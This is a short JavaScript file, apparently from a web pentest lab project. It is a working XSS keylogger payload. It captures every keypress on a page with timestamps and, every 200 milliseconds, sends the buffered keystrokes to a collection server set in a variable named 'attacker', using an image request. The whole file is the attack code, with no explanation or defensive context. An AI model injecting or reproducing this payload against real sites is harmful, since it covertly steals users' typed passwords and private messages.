var buffer = [];
var attacker = 'http://localhost/Web_Pentest_Program/xss_keylogger/server.php?a='

document.onkeypress = function(e) {
    var today = new Date();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
    var timestamp = date + ' ' + time;
    var stroke = {
        key: e.key,
        time: timestamp
    };
    buffer.push(stroke);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);